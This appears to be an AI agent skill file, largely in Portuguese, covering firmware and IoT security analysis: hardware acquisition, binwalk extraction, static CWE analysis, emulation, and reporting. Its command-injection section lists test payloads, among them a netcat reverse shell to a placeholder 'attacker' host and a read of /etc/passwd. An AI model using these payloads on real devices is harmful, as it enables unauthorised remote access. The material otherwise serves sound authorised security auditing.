---
name: firmware-analyst
description: Firmware/IoT security analysis and reverse engineering. Covers binwalk v3.1.0 (Rust rewrite, 31 Oct 2024), FACT_core 4.4.1 (14 Sep 2026), cwe_checker v0.9 (20 Aug 2026, experimental LKM support), BinSkim v4.4.9.7 (30 Mar 2026, .NET 9 required), QEMU user-mode emulation, Unicorn 2.1.4, and hardware acquisition (UART/JTAG/SPI/NOR/NAND/chip-off/logic analyzer). EMBA marked as "verify current state"; Firmadyne effectively deprecated since 2022. 2025-2026 toolchain.
disable-model-invocation: true
risk: unknown
source: community
date_added: '2026-09-22'
---

# Firmware Analyst — IoT/Embedded Security & Reverse Engineering

Estado da arte (2025-2026) para análise de firmware embarcado: extração, identificação de arquitetura, análise estática/dinâmica, emulação, descoberta de vulnerabilidades. Cobre binwalk v3.1.0 (Rust rewrite), FACT_core 4.4.1, cwe_checker v0.9 com suporte LKM experimental, BinSkim v4.4.9.7, QEMU user-mode, Unicorn 2.1.4, e aquisição via interfaces de hardware (UART/JTAG/SPI).

## Use this skill when

- Analisar firmware de dispositivos IoT/embedded (routers, câmeras IP, dispositivos médicos, automotivos, ICS/SCADA)
- Extrair firmware de vendor ou via interfaces de hardware
- Identificar sistema de arquivos embarcado (SquashFS, JFFS2, UBIFS, YAFFS, Cramfs)
- Identificar arquitetura do binário (ARM, MIPS, PowerPC, RISC-V, AVR, MSP430)
- Aplicar ferramentas de análise estática especializadas em firmware (FACT_core, cwe_checker)
- Montar ambiente de emulação user-mode (QEMU) ou full-system (Firmadyne, deprecated)
- Executar aquisição via UART, JTAG, SPI flash dump, chip-off

## Do not use this skill when

- O alvo é um binário de servidor/desktop ou mobile (use `reverse-engineer` ou `mobile-re`)
- Análise de malware pura sem foco em firmware (use `malware-analyst`)
- Memory forensics de host (use `memory-forensics`)
- A tarefa é análise de protocolo de rede sem contexto embarcado (use `protocol-reverse-engineering`)
- Bug bounty/reverse engineering sem autorização do proprietário do dispositivo

## Modern toolchain overview (Sep 2026)

| Tool | Versão (última) | Função principal | Notas |
|---|---|---|---|
| **binwalk v3** | **3.1.0** (31 out 2024) | Extração de firmware | **Rust rewrite** completa — significantly faster, fewer FPs; LUKS, NTFS, APFS, Btrfs, WinCE, TpLink RTOS, BIN firmware, Autel encoded |
| **FACT_core** | **4.4.1** (14 set 2026) | Análise automatizada de firmware | Ghidra 11.2 base image fix; v4.4 Ubuntu 26.04 + Python 3.14 + GraphQL aggregate; v4.3 PostgreSQL 17 + CVSS 4.0 + dark mode |
| **cwe_checker** | **0.9** (20 ago 2026) | Static CWE analysis em binários | **Experimental LKM** (`lkm_config.json`); CWE-252 nova check; abstraction layer para taint analysis |
| **BinSkim** | **4.4.9.7** (30 mar 2026) | Análise SAST binária Microsoft | `.NET 9` required; DWARF5 parser fix (Rust binaries); BA2025/BA2026 corrigidos |
| **Detect It Easy (DIE)** | DB contínua (atualizada 22 set 2026) | Identificação de packer/compiler | ~2.000+ signatures, mantido por horsicq |
| **Ghidra** | 12.1.4 (set 2026) | Disassembly + Decompiler | JDK 21 required; ver skill `reverse-engineer` |
| **IDA Pro** | 9.4 (jul 2026) | Disassembly + Decompiler | Swift/Rust/Go calling conventions; Hexagon/TriCore |
| **Binary Ninja** | 6.0 Krypton (set 2026) | Disassembly + Decompiler | MCP server incluso na Free |
| **Rizin** | 0.9.1 (jun 2026) | OSS RE framework | Cutter 2.5 GUI; ESIL deprecated → RzIL |
| **QEMU** | 9.x stable (2025+) | User-mode + full-system emulation | `qemu-user-static` para chroot |
| **Unicorn** | 2.1.4 (set 2025) | CPU emulation framework | LoongArch + S390x; Rust `unicorn-engine-sys` |
| **EMBA** | ⚠️ Verify current state | Firmware security analyzer | URL do repo original retornou 404 — verificar antes de usar |
| **Firmadyne** | Praticamente abandonado (desde 2022) | Full-system firmware emulation | Não recomendado para novos projetos |
| **Firmwalker** | mantido | Script de busca estática de IoCs | `firmwalker/firmwalker` no GitHub |
| **Sasquatch** | mantido | SquashFS com patches non-standard | `devttys0/sasquatch` |

## Acquisition methods

### 1. Download from vendor

```bash
# Vendor portal direto
wget -q --show-progress https://vendor.com/firmware/update.bin -O fw.bin

# Verificar integridade
sha256sum fw.bin
openssl dgst -sha256 fw.bin

# Procurar updates antigos (proteger contra tampering):
# 1. Wayback Machine (web.archive.org)
# 2. Censys / Shodan (busca de firmwares exposed)
# 3. Vendor security advisories
```

### 2. Hardware acquisition

```
UART console       - Serial console (115200 8N1 typical). Conectar TX/RX/GND.
                     Confirma root, lê /proc/mtd, dumps via dd.
JTAG/SWD           - Debug interface. JTAGulator para encontrar pinout.
                     OpenOCD + GDB para memory access.
SPI flash dump     - Leitura direta da flash via chip programmer.
                     Bus Pirate, Flashrom, CH341A programmer.
NAND/NOR dump     - Memdump de chips NOR (lineares) ou NAND (bad blocks).
                     Necessário desolder em alguns casos.
Chip-off           - Remoção física do chip, leitura em programmer externo.
                     Para chips BGA, necessário reballing.
Logic analyzer     - Captura de protocolos (SPI/I2C/UART) entre MCU e flash.
                     Saleae, Sigrok, Kingst LA.
```

#### Setup típico de UART

```bash
# Identificar baud rate
screen /dev/ttyUSB0 115200,cs8
# ou usar sigrok-cli + PulseView para decodificar UART

# Linux no device — copiar partições
cat /proc/mtd
# mtd0: 00040000 "u-boot"
# mtd1: 00100000 "kernel"
# mtd2: 00a00000 "rootfs"

dd if=/dev/mtd0 of=/tmp/u-boot.bin
dd if=/dev/mtd1 of=/tmp/kernel.bin
dd if=/dev/mtd2 of=/tmp/rootfs.bin
```

#### SPI flash com flashrom

```bash
# Identificar chip
flashrom -p linux_spi:dev=/dev/spidev0.0 --flash-size

# Dump (chip SOP8/SOIC8 clip)
flashrom -p linux_spi:dev=/dev/spidev0.0 -r dump.bin

# Com CH341A programmer (chips SPI NOR 25xxx series)
flashrom -p ch341a_spi -r dump.bin
```

#### JTAG via OpenOCD

```bash
# OpenOCD config para ARM (ex.: Texas Instruments)
openocd -f interface/jlink.cfg -f target/ti_cc2538.cfg

# Em outro terminal: GDB para o target
gdb-multiarch -ex "target remote localhost:3333"
(gdb) dump binary memory dump.bin 0x00000000 0x100000
```

### 3. Network acquisition

```bash
# TFTP durante boot (U-Boot, RedBoot)
# Configure server TFTP + trigger download via serial console

# HTTP/FTP from device web interface
# Extract via authenticated session

# Firmware over-the-air (OTA) update interception
mitmdump --mode transparent --showhost
# ou Wireshark em modo promíscuo

# Manufacturer-specific update protocols
# (cada vendor tem seu próprio — ver blog posts de RE da device)
```

## Identification phase

### File type + magic bytes

```bash
file firmware.bin
hexdump -C firmware.bin | head -50

# Vendor-specific magic bytes (reconhecimento rápido)
# TP-Link: "HSQS" / "TPON"
# Ubiquiti: "UBNT" header
# D-Link: "DLK" header
# Huawei: "HUAWEI" + signature
```

### Detect It Easy (DIE)

```bash
# CLI mode (build from source ou use prebuilt)
diec firmware.bin
# Database atualizada semanalmente (tag db/db_extra no repo)
# ~2.000+ signatures ativas
```

### binwalk v3.1.0 — scan rápido

```bash
# Scan básico (signature matching)
binwalk firmware.bin

# Scan verboso com output detalhado
binwalk -v firmware.bin

# Entropy graph (detecta compressão/criptografia)
binwalk --entropy firmware.bin
binwalk -E firmware.bin

# JSON output para parsing programático
binwalk -J firmware.bin

# Scan com signature customizada (YAML)
binwalk --signature=custom.yml firmware.bin
```

### Strings — busca por artefatos conhecidos

```bash
# Strings estáticas (>= 6 chars, ASCII printable)
strings -a -n 6 firmware.bin > strings.txt

# Strings Unicode (UTF-16LE, comuns em Windows CE)
strings -a -e l -n 6 firmware.bin >> strings.txt

# Procurar artefatos críticos
grep -iE "password|passwd|secret|api[_-]?key|token|private[_-]?key" strings.txt
grep -iE "BEGIN RSA|BEGIN CERT|BEGIN PRIVATE" firmware.bin
grep -iE "http://[^ ]*admin" strings.txt

# Endereços IP / URLs internos
grep -oE "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" strings.txt | sort -u
```

## Extraction phase

### binwalk v3.1.0 — recursive extraction (matryoshka)

```bash
# Extração simples
binwalk -e firmware.bin
binwalk --extract firmware.bin

# Recursive extraction (procura dentro de arquivos extraídos)
binwalk -eM firmware.bin
binwalk --extract --matryoshka firmware.bin

# Custom output directory
binwalk -e -C ./output firmware.bin

# Verbose recursive
binwalk -eM --verbose firmware.bin

# Suporte novo da v3.1.0 (Rust rewrite)
# LUKS header, NTFS, APFS, Btrfs, WinCE, TpLink RTOS, BIN firmware, Autel encoded
# "Significantly faster, far fewer false positives, support for many more file extractors"
```

### Manual extraction — filesystems específicos

```bash
# SquashFS (4.x) — sem compressão (raro)
unsquashfs -d ./out filesystem.squashfs

# SquashFS com compressões non-standard — usar sasquatch
# (Sasquatch = SquashFS tools patched com suporte a LZMA/XZ/LZO/etc.)
git clone https://github.com/devttys0/sasquatch
cd sasquatch && ./build.sh
# Binários em build/ — usar sasquatch unsquashfs variants

# JFFS2 (Little-endian, default)
jefferson filesystem.jffs2 -d ./output
# Big-endian variant
jefferson --big-endian filesystem.jffs2 -d ./output

# UBIFS
ubireader_extract_images firmware.ubi
ubireader_extract_files firmware.ubi -o ./output

# YAFFS / YAFFS2
unyaffs filesystem.yaffs ./output
# yaffs2utils: https://github.com/nicman23/yaffs2utils

# Cramfs
cramfsck -x ./output filesystem.cramfs

# RomFS (geralmente sem compressão)
# Mount direto no Linux moderno não suporta — usar genext2fs + tweaks
# ou extração manual lendo estrutura do superblock
```

### Quando binwalk falha — manual carving

```bash
# SquashFS magic: "hsqs" (little-endian) ou "sqsh" (big-endian)
binwalk -D 'squashfs:unsquashfs %e' firmware.bin

# gzip stream carving
binwalk -D 'gzip:gunzip %e' firmware.bin

# Yara-based carving (custom signatures)
yara -r rules.yara firmware.bin
```

## Filesystem analysis

### Inventário + arquivos críticos

```bash
# Estrutura geral
find . -type d | head -50
find . -type f | wc -l

# Arquivos de configuração sensíveis
find . \( -name "*.conf" -o -name "*.cfg" -o -name "*.ini" \) -type f

# Credenciais
find . -name "passwd" -o -name "shadow" -o -name "*.htpasswd"

# Web interfaces
find . \( -name "*.cgi" -o -name "*.php" -o -name "*.lua" -o -name "*.html" \) -type f

# Binários executáveis
find . -type f -executable | grep -v "lib\|\.so"

# Scripts de inicialização (init.d, rc.d, systemd)
find . -path "*/init.d/*" -o -path "*/rc.d/*" -o -path "*/systemd/*" -type f
```

### Busca de IoCs em massa

```bash
# Senhas / chaves hardcoded
grep -rni "password" --include="*" 2>/dev/null | head -30
grep -rni "api[_-]key" . 2>/dev/null
grep -rn "BEGIN RSA PRIVATE KEY" .
grep -rn "BEGIN OPENSSH PRIVATE KEY" .
grep -rn "BEGIN CERTIFICATE" .

# Backdoors / contas conhecidas
grep -rni "t0talc0ntr0l4ll\|debug\|toor\|alpine" --include="*.conf" --include="*.cfg"

# Endereços IP / endpoints internos
grep -rEoh "([0-9]{1,3}\.){3}[0-9]{1,3}" . | sort -u

# Comandos shell perigosos em scripts
grep -rn "system\|exec\|popen\|/bin/sh -c" --include="*.cgi" --include="*.php"
```

### Binários — security properties

```bash
# checksec — RELRO, NX, PIE, stack canary, fortify
checksec --dir=./bin/
checksec --file=./bin/httpd

# GDB/Pwntools — análise mais profunda
# (ver skill reverse-engineer)

# Strings suspeitas em binários
strings ./bin/httpd | grep -iE "password|token|api_key"
```

## Architecture identification

```bash
# Identificação rápida
file bin/httpd
file bin/daemon

# ELF header detail
readelf -h bin/httpd

# Mach-O (Apple/iOS)
otool -hv bin/daemon
```

### Tabela de arquiteturas comuns em IoT

| Arch | Endianness | Bits | Toolchain cross-compile | Common em |
|---|---|---|---|---|
| ARM | LE | 32 | `arm-linux-gnueabi-gcc` | Roteadores, câmeras, IoT genérico |
| AArch64 | LE | 64 | `aarch64-linux-gnu-gcc` | Modern routers, smartphones |
| MIPS | LE | 32 | `mipsel-linux-gnu-gcc` | Roteadores legacy (TP-Link, D-Link) |
| MIPS | BE | 32 | `mips-linux-gnu-gcc` | Cisco, alguns Broadcom |
| PowerPC | BE | 32 | `powerpc-linux-gnu-gcc` | Apple Airport, automotive |
| RISC-V | LE | 32/64 | `riscv64-linux-gnu-gcc` | Emerging (SiFive, ESP32-C) |
| AVR | LE | 8 | `avr-gcc` | Arduino, smart locks |
| MSP430 | LE | 16 | `msp430-elf-gcc` | Sensor nodes, low-power |
| Xtensa | LE | 32 | `xtensa-esp32-elf-gcc` | ESP32, ESP8266 |
| SuperH | LE/BE | 32 | `sh-linux-gnu-gcc` | Sega, automotive legacy |

### Cross-compilation para PoC/exploit

```bash
# ARM hardfloat (cortex-A)
arm-linux-gnueabihf-gcc exploit.c -o exploit_arm
# ARM softfloat
arm-linux-gnueabi-gcc exploit.c -o exploit_arm

# MIPS little-endian (TP-Link, etc.)
mipsel-linux-gnu-gcc exploit.c -o exploit_mipsel

# AArch64
aarch64-linux-gnu-gcc exploit.c -o exploit_arm64

# RISC-V 64
riscv64-linux-gnu-gcc exploit.c -o exploit_riscv64

# Statically linked (sem dependências de libc)
arm-linux-gnueabi-static gcc exploit.c -o exploit_arm_static
```

## Binary analysis

Ver skill `reverse-engineer` para workflow detalhado. Resumo:

| Tool | Melhor para | Notas |
|---|---|---|
| **Ghidra 12.1.4** | Free + multi-arch + decompiler | JDK 21 required; Hexagon novo |
| **IDA Pro 9.4** | Swift/Rust/Go calling conv; Hexagon QDSP6 | Comercial gold standard |
| **Binary Ninja 6.0** | MCP para LLM agents; 19 archs; AArch64 no Free | Único com MCP first-party |
| **Rizin 0.9.1** | Scripted workflows; Cutter GUI | ESIL deprecated → RzIL |

### Workflow típico de análise binária embarcada

1. **Load** em Ghidra/IDA/BN com arquitetura correta (auto-detect geralmente funciona)
2. **Find entry points**: `main`, `init`, exports, constructors em `.init_array`
3. **Map structure**: distinguir libc/musl/uclibc vs user code
5. **Identify dangerous sinks**: `system`, `popen`, `strcpy`, `sprintf`, `gets`, `execve`
6. **Track taint**: input HTTP/CGI → dangerous function (manual ou com angr)
7. **Document findings**: function signatures + data structures + PoC

## Common vulnerability classes

### Authentication issues

```
Hardcoded credentials  - Default passwords (admin/admin, root/root, user/user)
                         Buscar em /etc/passwd, /etc/shadow, .conf files
Backdoor accounts      - Hidden users (uid 0 com nomes obscuros)
                         grep /etc/passwd por shell válido (/bin/sh, / /bin/bash)
Weak password hashing  - MD5, SHA1 sem salt, DES crypt(3)
                         Buscar constantes MD5 init: 0x67452301, etc.
Auth bypass            - Comparação lógica falha
                         strcmp(input, "admin") == 0 sem hashing prévio
Session management     - Tokens previsíveis (timestamp + counter)
                         Buscar rand(), srand(time(NULL))
```

### Command injection

```c
// Padrão vulnerável típico de IoT
char cmd[256];
sprintf(cmd, "ping -c 1 %s", user_input);
system(cmd);

// Test payloads (NÃO executar em produção)
// ; id
// | cat /etc/passwd
// `whoami`
// $(id)
// ; nc attacker 4444 -e /bin/sh
```

### Memory corruption

```
Stack buffer overflow   - strcpy, sprintf, memcpy sem bounds
                         Buscar ocorrências em busybox + custom daemons
Heap overflow          - malloc(size) onde size é user-controlled
                         Custom allocators em kernels embarcados
Format string          - printf(user_input) sem "%s"
                         Buscar printf/sprintf com single arg de fonte externa
Integer overflow       - Size calculations (uint16 + uint16 = 0, ...)
                         Parse de headers HTTP custom
Use-after-free          - Free de pointer mantido em cache
                         Connection pools, netfilter hooks
```

### Information disclosure

```
Debug interfaces       - UART sem lock, JTAG unlocked em produção
Verbose errors         - Stack traces expostos via CGI/HTTP
Config files          - /tmp/debug.cfg, /var/log/error.log readable
Firmware updates      - Downloads sem assinatura digital
                       - md5 em cleartext no manifesto
                       - Verificar RSA/ECDSA signature verification
```

## FACT_core workflow (Firmware Analysis Comparison Tool)

FACT_core é o pipeline automatizado para processar firmware em escala (CI-style). Versão atual **v4.4.1** (14 set 2026).

### Features da linha v4.x (2025-2026)

| Versão | Data | Mudanças principais |
|---|---|---|
| **4.4.1** | 14 set 2026 | Bug fix da imagem Ghidra 11.2 base |
| **4.4.0** | 23 jun 2026 | Ubuntu 26.04, Python 3.14, GraphQL aggregate queries, plugin timeout config |
| **4.3.0** | 12 jan 2026 | YAFFS filesystem, CVSS 4.0+, dark mode, cancel analyses, PostgreSQL 17, Debian 13 |
| **4.2.0** | 04 set 2025 | Ubuntu 24.04, Python 3.12, CVE data source trocada, kernel image icons |

### Setup típico

```bash
# Clone repo oficial
git clone https://github.com/fkie-cad/FACT_core
cd FACT_core

# Docker-based (recomendado) — provisiona DB + frontend + backend
docker-compose up -d

# Após up: dashboard em http://localhost:5000
# Upload firmware → analysis roda automaticamente:
#   - extraction (binwalk + custom rules)
#   - file analysis (DIE, FLOSS, capa, cwe_checker, BinSkim)
#   - comparison (BinDiff-like)
#   - CVE matching (CVSS 4.0+)
#   - Result: dashboard com findings + diffs
```

### Quando usar FACT_core

- **Comparar versões** de firmware (vendor patch detection)
- **Scale**: processar 10+ firmwares automaticamente
- **CVE enrichment**: FACT integra NVD/CVE data com CVSS 4.0
- **Audit pipeline**: integra com CI/CD para detectar regressions de segurança

### Quando NÃO usar FACT_core

- **Análise única de 1 firmware**: overhead de setup grande demais, usar binwalk + manual
- **Hardware RE**: FACT não cobre aquisição via JTAG/UART
- **Mobile RE**: use MobSF em vez disso

## cwe_checker v0.9 — static CWE analysis

`cwe_checker` faz análise estática de binários ELF (Linux/BSD) e identifica padrões correspondentes a CWE específicas. **v0.9** (20 ago 2026) adicionou suporte LKM experimental.

### Checks disponíveis (v0.9)

| CWE | Descrição | User-space | LKM |
|---|---|---|---|
| **CWE-78** | OS Command Injection | ✅ | — |
| **CWE-119** | Improper Restriction of Operations within Buffer Bounds | ✅ | ✅ |
| **CWE-125** | Out-of-bounds Read | ✅ | — |
| **CWE-134** | Format String | ✅ | — |
| **CWE-190** | Integer Overflow | ✅ | — |
| **CWE-252** | Unchecked Return Value | ✅ | ✅ **(NEW v0.9)** |
| **CWE-337** | Predictable Seed in PRNG | ✅ | — |
| **CWE-416** | Use After Free | ✅ | — |
| **CWE-457** | Use of Uninitialized Variable | ✅ | — |
| **CWE-467** | Use of sizeof() on Pointer Type | ✅ | — |
| **CWE-476** | NULL Pointer Dereference | ✅ | — |
| **CWE-787** | Out-of-bounds Write | ✅ | — |
| **CWE-789** | Memory Allocation with Excessive Size | ✅ | — |

### Uso básico

```bash
# User-space analysis
cwe_checker firmware_binary
# JSON output para parsing programático
cwe_checker firmware_binary --json

# LKM analysis (experimental — v0.9)
cwe_checker --config lkm_config.json kernel_module.ko
# lkm_config.json: separado, otimizado para kernel modules
```

### Evolução recente (releases anteriores)

- **v0.8 (22 fev 2026)** — pointer inference rastreia nested parameters; CWE-416 com menos FPs; CWE-337.
- **v0.7 (22 jun 2025)** — CWE-789; meta-info em CWE-119/CWE-416 JSON.
- **v0.6 (13 jun 2025)** — abstract domains melhorados; CWE-78/119/416 reescritos.
- **v0.5 (05 jul 2024)** — Ghidra como standard backend (removido BAP backend).

### Integração com binwalk pipeline

```bash
#!/bin/bash
# Extrair firmware + rodar cwe_checker em todos os binários
mkdir -p extracted
binwalk -eM -C extracted firmware.bin

find extracted -type f -executable -exec sh -c '
    file "$1" | grep -q "ELF" && {
        echo "[*] Analyzing $1"
        cwe_checker "$1" --json > "${1}.cwe.json"
    }
' _ {} \;
```

## BinSkim v4.4.9.7 — Microsoft SAST

BinSkim analisa binários PE executáveis Windows para verificar configurações de segurança do compilador (Control Flow Guard, SafeSEH, etc.). Útil para IoT Windows-based (routers Windows CE, câmeras IP com Windows IoT).

### Requisitos (v4.4.9.7)

- **.NET 9** obrigatório — paths mudaram: `tools\net9.0\win-x64\BinSkim.exe`

### Uso básico

```cmd
REM Scan single PE
BinSkim.exe analyze firmware.exe

REM JSON output para CI/CD
BinSkim.exe analyze firmware.exe --output FilePath=result.json

REM Recursive scan em diretório
BinSkim.exe analyze C:\firmware\

REM Disable archive extraction (firmware containers)
BinSkim.exe analyze firmware.exe --disable-archive-extraction

REM Run only specific rules
BinSkim.exe analyze firmware.exe --run-only-rules BA2025,BA2026
```

### Checks principais (BA-numbers)

- **BA2002**: ARGLESS non-validating call to printf
- **BA2016**: Enable High-entropy Virtual Address Space Randomization (VASR)
- **BA2021**: Do not mark stack as executable
- **BA2025**: Enable shadow stack (correto para Rust binaries em 4.4.9.7)
- **BA2026**: Enable Microsoft compiler SDL switch (Rust isNotApplicable em 4.4.9.7)

### Quando usar BinSkim em firmware RE

- Firmware Windows CE / Windows IoT Core
- Componentes Windows em gateways industriais
- Bootloaders EFI/UEFI (analisar .efi)
- Validar que binários vendor não têm mitigations desabilitadas

## Emulation

### QEMU user-mode emulation (recomendado)

```bash
# Install
apt install qemu-user-static qemu-user-binfmt

# Registrar binfmt (Linux) — executa ARM/MIPS binários direto
update-binfmts --enable qemu-user
update-binfmts --enable qemu-user-binfmt

# Chroot no rootfs extraído
cp /usr/bin/qemu-arm-static ./squashfs-root/usr/bin/
sudo chroot squashfs-root /usr/bin/qemu-arm-static /bin/sh

# Executar daemon específico
sudo chroot squashfs-root /usr/bin/qemu-arm-static /usr/sbin/httpd

# Networking dentro do chroot (NAT)
sudo ip link set qemu-bridge up
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

### QEMU full-system emulation (Firmadyne — DEPRECATED)

Firmadyne está praticamente abandonado desde 2022. **Não recomendado para novos projetos**.

Alternando em uso:
- **FACT_core** + QEMU user-mode (acima)
- **QEMU full-system manual** com custom image build
- **Unicorn 2.1.4** para emulação programática de trechos específicos

```bash
# QEMU full-system manual (modern alternative)
# 1. Criar rootfs image
qemu-img create -f qcow2 firmware.qcow2 1G
# 2. Attach rootfs + kernel
qemu-system-arm -M virt -kernel vmlinuz -initrd initrd.img \
    -drive if=none,file=firmware.qcow2,format=qcow2,id=hd0 \
    -device virtio-blk-device,drive=hd0 \
    -netdev user,id=net0 -device virtio-net-device,netdev=net0 \
    -nographic
```

### Unicorn Engine 2.1.4 — programmatic emulation

```python
from unicorn import *
from unicorn.arm_const import *

# ARM Cortex-M3 emulation example
def emulate_arm_firmware(binary, base_addr=0x08000000):
    mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB)

    # Map firmware
    with open(binary, "rb") as f:
        code = f.read()
    mu.mem_map(base_addr, len(code) + 0x1000)
    mu.mem_write(base_addr, code)

    # Map stack + RAM
    STACK_ADDR = 0x20000000
    RAM_ADDR = 0x20000100
    mu.mem_map(STACK_ADDR, 0x10000)
    mu.reg_write(UC_ARM_REG_SP, STACK_ADDR + 0x8000)

    # Hook para syscalls / I/O
    def hook_code(uc, address, size, user):
        pc = uc.reg_read(UC_ARM_REG_PC)
        if pc == 0x08000123:  # syscall handler
            r0 = uc.reg_read(UC_ARM_REG_R0)
            print(f"syscall r0={hex(r0)}")
    mu.hook_add(UC_HOOK_CODE, hook_code)

    # Run
    try:
        mu.emu_start(base_addr, base_addr + len(code), timeout=10*UC_SECOND_SCALE)
    except UcError as e:
        print(f"Emulation error: {e}")
```

### Unicorn 2.x features relevantes para firmware RE

- **ABI3 wheels**: menor overhead em CI/CD
- **`from_handle_with_data`**: passar contexto Python para callbacks
- **Bypass MMU option**: emular bare-metal sem tradução de endereços
- **Snapshot memory copy-on-write**: snapshots rápidos de estado
- **ARM ESR register** + **m68k SR register** corrigidos
- **LoongArch** + **S390x** suportados
- **Rust bindings** standalone (`unicorn-engine-sys`)

## Hardware tools

### Bus Pirate (universal serial interface)

```
Pinout (v3.6):
  GND,  +3V3, +5V0, ADC, VPU, AUX, BR0,
  SDA, SCL, FREQ, CS, AUX2, MOSI, CLK,
  MISO, CS*, TX, RX

Comandos comuns:
  m   - mode (HiZ, 1-Wire, UART, I2C, SPI, etc.)
  HiZ - high-impedance (default)
  4   - SPI mode
  3   - I2C mode
  1   - UART mode
```

### JTAGulator (JTAG/UART discovery)

- Scan automático de pinouts JTAG (TCK, TMS, TDI, TDO, TRST)
- Identifica UART TX/RX sem sem conhecimento prévio
- Suporta OpenOCD via SVF player
- https://github.com/grandideastudio/jtagulator

### Flashrom (flash chip programmer)

```bash
# Suportado: SPI, parallel, LPC, FWH, BIOS, etc.
flashrom --programmer help

# Chips NOR comuns: 25xxx series (SPI), 39/49 series (parallel)
flashrom -p ch341a_spi -r dump.bin
flashrom -p buspirate_spi:dev=/dev/ttyUSB0 -r dump.bin

# Verificação
flashrom -p ch341a_spi -v dump.bin
```

### ChipWhisperer (side-channel analysis)

- Power analysis + fault injection em microcontroladores
- Útil para extrair chaves criptográficas de smart cards, secure boot bypass
- Hardware custom (não trivial setup) — ver docs oficiais
- https://github.com/newaetech/chipwhisperer

## Security assessment checklist

```markdown
[ ] Aquisição: vendor download + SHA256 verification
[ ] Aquisição alternativa: hardware dump via UART/JTAG/SPI
[ ] Identificação: file, binwalk, DIE
[ ] Extração: binwalk -eM + manual extraction (squashfs/jffs2/ubifs)
[ ] Filesystem mount: chroot com qemu-user-static
[ ] Inventário de binários + scripts de init
[ ] Busca de credenciais hardcoded (strings + grep recursivo)
[ ] Análise estática automatizada: cwe_checker em todos os ELF
[ ] Análise estática automatizada: capa em binários críticos
[ ] Análise estática automatizada: BinSkim em PE Windows CE (se aplicável)
[ ] Identificação de arquitetura + cross-compile para PoC
[ ] Bug hunting: command injection, buffer overflow, format string
[ ] Network services: identificar portas abertas, protocolos custom
[ ] Update mechanism: signed? encrypted? transport security?
[ ] Web interface (se houver): análise de input validation
[ ] Debug interfaces: UART locked? JTAG disabled? Bootloader password?
[ ] Comparação com versões anteriores (FACT_core diff)
[ ] CVE matching: NVD / vendor advisories
[ ] Documentar findings + PoC + remediation
[ ] Reporting: severity (CVSS 4.0) + reproducible steps
```

## Reporting template

```markdown
# Firmware Security Assessment — [Device Model]

## Device Information
- Manufacturer:
- Model:
- Firmware version analyzed:
- SHA256 of firmware:
- Acquisition method: vendor download / hardware (UART/JTAG/SPI)
- Architecture: ARM / MIPS / RISC-V / ...

## Summary
| Severity | Count |
|---|---|
| Critical | 0 |
| High | 0 |
| Medium | 0 |
| Low | 0 |
| Info | 0 |

## Findings

### Finding 1: [Title]
- **Severity**: Critical / High / Medium / Low
- **CVSS 4.0 score**: X.X (vector string)
- **CWE**: CWE-XXX (if applicable)
- **Location**: /path/to/file:line OR function @ offset
- **Description**: ...
- **Proof of Concept**:
  ```bash
  # Reproduction steps or exploit code
  ```
- **Impact**: ...
- **Remediation**: ...
- **References**: vendor advisory, similar CVE, etc.

### Finding 2: ...

## Tooling used
- binwalk v3.1.0 (extraction)
- FACT_core v4.4.1 (automated analysis, if used)
- cwe_checker v0.9 (CWE analysis)
- BinSkim v4.4.9.7 (if PE binaries)
- Ghidra 12.1.4 / IDA Pro 9.4 (decompilation)
- QEMU 9.x user-mode (emulation)

## Recommendations
1. Immediate: patch Critical/High findings
2. Short-term: fix Medium findings, disable debug interfaces
3. Long-term: secure boot, signed updates, hardware root of trust

## Appendix
- Filesystem tree (high-level)
- List of detected services (Nmap scan, if emulation used)
- NVD/CVE matches
- YARA rules for detection
```

## Ethical guidelines

### Appropriate use

- Security audits **with written authorization** do device owner
- Bug bounty programs (vendor-sanctioned)
- Academic research em devices próprios / sandboxes
- CTF competitions (challenges designed for RE)
- Personal device analysis (seu próprio equipamento)
- Vulnerability disclosure responsável (coordinated disclosure)

### Never assist with

- Unauthorized access a devices que não possui/opera
- Bypass de DRM/licensing de forma ilegal
- Criar firmware malicioso para deployment
- Attack em devices sem permissão explícita
- Industrial espionage / competitive intelligence
- Extração de cryptographic keys sem authorization
- Reverse engineering de produtos concorrentes para patent violations

### Required disclaimers em reports

> "This assessment was conducted with explicit authorization from [device owner] under [scope]. Findings are documented for the purpose of [vulnerability disclosure / security improvement / audit]. Exploitation beyond what is necessary for proof-of-concept reproduction is prohibited."

## Tools deprecated ou em status incerto

| Tool | Status | Recomendação |
|---|---|---|
| **EMBA** | ⚠️ **Verify** — URL original 404 em pesquisa set 2026 | Buscar `emba-framework/emba` ou `e-m-b-a/emba` antes de usar |
| **Firmadyne** | Praticamente abandonado desde 2022 | **Não usar em novos projetos**; preferir FACT_core + QEMU user-mode |
| **firmware-mod-kit** | Estável mas antigo (legacy) | OK para SquashFS modification; para extração usar binwalk v3 |
| **binwalk v2.x** | Substituído por v3.x (significantly faster, fewer FPs) | Migrar para v3.1.0 |
| **angr para LKM** | Não tem suporte first-party | cwe_checker v0.9 com `lkm_config.json` |

## Resources

- `resources/implementation-playbook.md` — exemplos detalhados por tool
- `reverse-engineer` skill — workflow de análise binária geral (IDA/Ghidra/BN/Rizin)
- `mobile-re` skill — Android/iOS RE (MobSF 4.5.x + Frida 17.x)
- `malware-analyst` skill — análise de malware geral
- `protocol-reverse-engineering` skill — Wireshark 4.6.x + mitmproxy 12.x
- `memory-forensics` skill — Volatility 3 v2.28.x
- `anti-reversing-techniques` skill — packers, anti-Frida, anti-LLM
- `binary-analysis-patterns` skill — padrões assembly

## Integração com system-dissector

Esta skill é um **instrumento** consumido por `system-dissector` durante as fases 2-4:

- **Quando invocar**: Phase 2 (deep-dive) ou Phase 4 (extract) do `system-dissector`
- **Tipo de alvo**: source | binary | mobile | firmware | protocol
- **Output esperado**: wiki page ou extract component
- **Templates relacionados**: `templates/deep-dive-{architecture,module}.md.template`, `templates/extract-{components,patterns}.md.template`

**Contrato**:
- Path canônico: `dissects/<sistema>/<fase>/<arquivo>.md`
- Use `evidence: verified|estimated` em todo `file:line`
- Rubrica C1-C6 quando aplicável (consulte `extract-components.md.template`)
- Companion: `neodoo-integrate` para port-plan (Phase 5)

## References

- binwalk v3.1.0 release (31 Oct 2024) — ReFirmLabs
- FACT_core v4.4.1 release (14 Sep 2026) — fkie-cad
- cwe_checker v0.9 release (20 Aug 2026) — fkie-cad
